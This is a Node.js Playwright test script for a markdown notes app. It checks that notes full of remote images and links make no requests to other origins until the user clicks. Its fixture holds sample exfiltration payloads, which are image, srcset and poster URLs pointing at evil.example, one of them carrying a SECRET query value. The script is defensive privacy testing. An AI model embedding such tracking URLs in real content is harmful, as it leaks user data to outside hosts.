// Headless check (WP0.6): opening notes full of remote images and links
// makes zero requests to any other origin, in the reader, the split
// preview and Live Preview, under the production CSP. Also checks that
// a click on a placeholder is what loads (or offers) the image.
//
//   npm run build
//   npm i --no-save playwright-core     # uses an installed chromium headless shell
//   MOCK_EXTRA_NOTES=/tmp/notes.json node scripts/perf/mock-server.mjs 4777 &
//     (write the notes file with: node scripts/perf/no-remote-requests.mjs --notes /tmp/notes.json)
//   node scripts/perf/no-remote-requests.mjs [http://127.0.0.1:4777]
//
// Exit code 1 on any outbound request before a click, or on page errors.

import fs from 'node:fs';

const args = process.argv.slice(2);
const HOSTILE = [
  '# Remote content',
  '',
  '![leak](https://evil.example/p.png?q=SECRET)',
  'inline ![x](http://evil.example/i.gif) and a [link](https://evil.example/page) and <https://evil.example/auto>',
  '',
  '<img src="https://evil.example/raw.png" alt="raw">',
  '<img srcset="https://evil.example/a.png 1x">',
  '<video poster="https://evil.example/poster.jpg"></video>',
  '',
  '| a | b |',
  '|---|---|',
  '| ![t](https://evil.example/cell.png) | 2 |',
  '',
  '> [!note] callout ![c](https://evil.example/callout.png)',
  '',
].join('\n');

if (args[0] === '--notes') {
  fs.writeFileSync(args[1], JSON.stringify([{ id: 'hostile', path: 'Hostile.md', body: HOSTILE }]));
  process.exit(0);
}

const { chromium } = await import('playwright-core');
const BASE = args.find((a) => a.startsWith('http')) ?? 'http://127.0.0.1:4777';
const origin = new URL(BASE).origin;
const browser = await chromium.launch({ headless: true, executablePath: process.env.CHROME || undefined });
const ctx = await browser.newContext({ viewport: { width: 1400, height: 900 } });
const page = await ctx.newPage();
const outbound = [];
const errors = [];
page.on('request', (r) => {
  const u = new URL(r.url());
  if (u.protocol.startsWith('http') && u.origin !== origin) outbound.push(r.url());
});
page.on('pageerror', (e) => errors.push(e.message));
// Never let a request leave the machine, even if one slips through.
await ctx.route((url) => !url.href.startsWith(origin), (route) => route.abort());

await page.goto(BASE + '/');
await page.fill('#lumi-server-url', BASE);
await page.fill('#lumi-username', 'admin');
await page.fill('#lumi-password', 'pw');
await page.keyboard.press('Enter');
await page.waitForSelector('[data-testid=floating-explorer]', { timeout: 15000 });
await page.waitForTimeout(400);
await page.locator('[data-testid=floating-explorer] .fx-current').getByText('Hostile', { exact: true }).first().click();
await page.keyboard.press('Enter');
await page.waitForSelector('.md-remote-img', { timeout: 8000 });
await page.waitForTimeout(1500);
const reader = { placeholders: await page.locator('.md-body .md-remote-img').count(), outbound: outbound.length };

// A click is the user's choice: the fetch to the remote host happens
// then (aborted here), and the placeholder turns into a safe link.
const before = outbound.length;
await page.locator('.md-body .md-remote-img').first().click().catch(() => {});
await page.waitForTimeout(800);
const clicked = { requested: outbound.slice(before), link: await page.locator('a.md-remote-img-link').count() };

// Live Preview: the editor shows placeholders too.
let live = null;
const editBtn = page.getByRole('button', { name: /editar|edit/i }).first();
if (await editBtn.count()) {
  await editBtn.click().catch(() => {});
  await page.waitForTimeout(2000);
  live = { placeholders: await page.locator('.cm-editor .md-remote-img').count() };
}

const afterClick = outbound.slice(before + clicked.requested.length);
console.log(JSON.stringify({ reader, clicked, live, outboundBeforeClick: outbound.slice(0, before), unexpectedLater: afterClick, errors }, null, 2));
await browser.close();
process.exit(before === 0 && afterClick.length === 0 && errors.length === 0 ? 0 : 1);
